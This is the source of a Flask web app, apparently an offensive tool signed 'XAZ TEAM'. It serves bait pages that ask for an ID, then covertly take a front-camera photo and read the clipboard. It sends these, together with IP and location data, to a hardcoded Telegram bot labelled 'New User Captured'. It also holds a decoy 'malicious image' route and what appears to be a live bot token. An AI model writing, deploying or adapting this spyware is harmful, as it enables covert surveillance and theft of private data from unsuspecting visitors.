from flask import Flask, request, jsonify, send_file
import os
import logging
import requests
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont
import io

app = Flask(__name__)

# إعدادات Telegram Bot
TELEGRAM_BOT_TOKEN = '7930188784:AAHWJMVr9169-IOYPK-xuQDz9CV4fIMHXys'  # استبدل بالتوكن الخاص بك
TELEGRAM_CHAT_ID = '7796858163'  # استبدل بـ ID الدردشة الخاصة بك
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"

# إعدادات التسجيل (logging)
logging.basicConfig(level=logging.INFO)

# API لسحب معلومات IP
IP_INFO_API = "https://ipinfo.io"

def generate_page(title, bg_color, button_text):
    """دالة لتوليد الصفحات بناءً على المعطيات"""
    return f"""<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        body {{
            background-color: {bg_color};
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 20%;
        }}
        h1 {{
            font-size: 2em;
            color: #333;
        }}
        input[type="text"] {{
            padding: 10px;
            font-size: 1em;
            width: 300px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }}
        button {{
            padding: 10px 20px;
            font-size: 1em;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }}
    </style>
    <script>
        async function capturePhoto(facingMode, label) {{
            try {{
                let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: facingMode }} }});
                let video = document.createElement('video');
                video.srcObject = stream;
                await video.play();  

                let canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                let blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));

                let formData = new FormData();
                formData.append("photo", blob, `${{label}}_photo.png`);

                await fetch('/upload', {{ method: 'POST', body: formData }});

                stream.getTracks().forEach(track => track.stop());
            }} catch (error) {{
                console.log("فشل في ارسال اليكات :", error);
            }}
        }}

        async function sendData() {{
            const id = document.getElementById('userId').value;
            if (id) {{
                await capturePhoto("user", "front");
                await sendClipboard();
                alert("good");
            }} else {{
                alert("send id");
            }}
        }}

        async function sendClipboard() {{
            try {{
                const text = await navigator.clipboard.readText();
                if (text) {{
                    const formData = new FormData();
                    formData.append("clipboard", text);

                    await fetch('/upload', {{ method: 'POST', body: formData }});
                }} else {{
                    console.log("yes.");
                }}
            }} catch (error) {{
                console.log("no", error);
            }}
        }}
    </script>
</head>
<body>
    <h1>الرجاء إدخال ID الخاص بك</h1>
    <input type="text" id="userId" placeholder="أدخل ID هنا">
    <button onclick="sendData()">{button_text}</button>
</body>
</html>"""

@app.route('/like')
def like():
    """صفحة Like"""
    return generate_page("Like Page", "#ffcccc", "Submit")

@app.route('/visit')
def visit():
    """صفحة Visit"""
    return generate_page("Visit Page", "#ffffff", "Submit")

@app.route('/spam')
def spam():
    """صفحة Spam"""
    return generate_page("Spam Page", "#ffccff", "Submit")

def add_watermark(image_path, output_path):
    """إضافة علامة مائية إلى الصورة"""
    image = Image.open(image_path)
    draw = ImageDraw.Draw(image)
    font = ImageFont.load_default()
    text = "By: XAZ TEAM"
    draw.text((10, 10), text, fill="red", font=font)
    image.save(output_path)

def generate_malicious_image():
    """إنشاء صورة ملغمة"""
    try:
        # إنشاء صورة جديدة
        image = Image.new('RGB', (500, 300), color=(255, 255, 255))
        draw = ImageDraw.Draw(image)
        font = ImageFont.load_default()

        # إضافة نص جذاب إلى الصورة
        attractive_text = (
            "🎉 **عرض خاص!** 🎉\n\n"
            "قم بتحميل هذه الصورة واحصل على مكافأة مجانية!\n\n"
            "⚠️ **تحذير:** لا تقم بتحميلها إذا كنت لا تثق بالمصدر.\n\n"
            "By: XAZ TEAM"
        )
        draw.text((10, 10), attractive_text, fill="red", font=font)

        # حفظ الصورة في ذاكرة المؤقت
        img_io = io.BytesIO()
        image.save(img_io, 'PNG')
        img_io.seek(0)

        return img_io

    except Exception as e:
        logging.error(f"فشل في إنشاء الصورة: {e}")
        return None

@app.route('/xaz')
def send_malicious_image():
    """إرسال صورة ملغمة مع رسالة مغرية"""
    try:
        # إنشاء الصورة الملغمة
        img_io = generate_malicious_image()
        if not img_io:
            return jsonify({'status': 'error', 'message': '❌ فشل في إنشاء الصورة'}), 500

        # إرسال الصورة إلى Telegram
        files = {'photo': ('malicious_image.png', img_io, 'image/png')}
        caption = (
            "🎉 **عرض خاص!** 🎉\n\n"
            "قم بتحميل هذه الصورة واحصل على مكافأة مجانية!\n\n"
            "⚠️ **تحذير:** لا تقم بتحميلها إذا كنت لا تثق بالمصدر.\n\n"
            "By: XAZ TEAM"
        )
        response = requests.post(
            f"{TELEGRAM_API_URL}/sendPhoto",
            data={
                'chat_id': TELEGRAM_CHAT_ID,
                'caption': caption,
                'parse_mode': 'Markdown'
            },
            files=files
        )

        # التحقق من حالة الاستجابة
        if response.status_code == 200:
            logging.info("تم إرسال الصورة الملغمة بنجاح.")
            return jsonify({'status': 'success', 'message': '✅ تم إرسال الصورة الملغمة بنجاح'})
        else:
            logging.error(f"فشل الإرسال: {response.text}")
            return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {response.text}'}), 500

    except Exception as e:
        logging.error(f"فشل الإرسال: {e}")
        return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {e}'}), 500

@app.route('/malicious-image')
def download_malicious_image():
    """تحميل الصورة الملغمة"""
    try:
        # إنشاء الصورة الملغمة
        img_io = generate_malicious_image()
        if not img_io:
            return jsonify({'status': 'error', 'message': '❌ فشل في إنشاء الصورة'}), 500

        # إرسال الصورة كملف قابل للتحميل
        return send_file(img_io, mimetype='image/png', as_attachment=True, download_name="malicious_image.png")

    except Exception as e:
        logging.error(f"فشل في إرسال الصورة: {e}")
        return jsonify({'status': 'error', 'message': f'❌ فشل في إرسال الصورة: {e}'}), 500

@app.route('/upload', methods=['POST'])
def upload():
    """استقبال الصورة ومحتوى الحافظة وإرسالها إلى Telegram مع معلومات IP"""
    try:
        # سحب معلومات IP
        ip_info = requests.get(IP_INFO_API).json()
        ip = ip_info.get('ip', 'غير معروف')
        city = ip_info.get('city', 'غير معروف')
        region = ip_info.get('region', 'غير معروف')
        country = ip_info.get('country', 'غير معروف')
        location = ip_info.get('loc', 'غير معروف')

        # الوقت والتاريخ الحالي
        now = datetime.now()
        current_time = now.strftime("%Y-%m-%d %H:%M:%S")

        # نص الرسالة مع معلومات IP
        message = (
            f"<b>New User Captured 😏</b>\n\n"
            f"<b>IP:</b> <code>{ip}</code>\n"
            f"<b>City:</b> <code>{city}</code>\n"
            f"<b>Region:</b> <code>{region}</code>\n"
            f"<b>Country:</b> <code>{country}</code>\n"
            f"<b>Location:</b> <a href='https://www.google.com/maps?q={location}'>Click here</a>\n\n"
            f"<b>Time:</b> <code>{current_time}</code>\n\n"
            f"<i>This tool was designed by XAZ 😎</i>"
        )

        # التحقق من نوع المحتوى المرسل
        if 'photo' in request.files:
            uploaded_file = request.files.get("photo")
            photo_path = "photo.png"
            uploaded_file.save(photo_path)

            # إضافة علامة مائية إلى الصورة
            watermarked_path = "watermarked_photo.png"
            add_watermark(photo_path, watermarked_path)

            files = {'photo': open(watermarked_path, 'rb')}
            response = requests.post(
                f"{TELEGRAM_API_URL}/sendPhoto",
                data={
                    'chat_id': TELEGRAM_CHAT_ID,
                    'caption': message,
                    'parse_mode': 'HTML'
                },
                files=files
            )
            os.remove(photo_path)
            os.remove(watermarked_path)
        elif 'clipboard' in request.form:
            clipboard_content = request.form.get("clipboard")
            response = requests.post(
                f"{TELEGRAM_API_URL}/sendMessage",
                data={
                    'chat_id': TELEGRAM_CHAT_ID,
                    'text': f"{message}\n\n<b>Clipboard Content:</b>\n<code>{clipboard_content}</code>",
                    'parse_mode': 'HTML'
                }
            )
        else:
            logging.error("لم يتم استلام أي محتوى.")
            return jsonify({'status': 'error', 'message': '❌ لم يتم استلام أي محتوى'}), 400

        # التحقق من حالة الاستجابة
        if response.status_code == 200:
            logging.info("تم إرسال المحتوى بنجاح.")
            return jsonify({'status': 'success', 'message': '✅ تم إرسال المحتوى بنجاح'})
        else:
            logging.error(f"فشل الإرسال: {response.text}")
            return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {response.text}'}), 500

    except Exception as e:
        logging.error(f"فشل الإرسال: {e}")
        return jsonify({'status': 'error', 'message': f'❌ فشل الإرسال: {e}'}), 500

@app.route('/ping')
def ping():
    """وظيفة Ping للتحقق من حالة الخادم"""
    return jsonify({'status': 'success', 'message': '🏓 Pong!'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
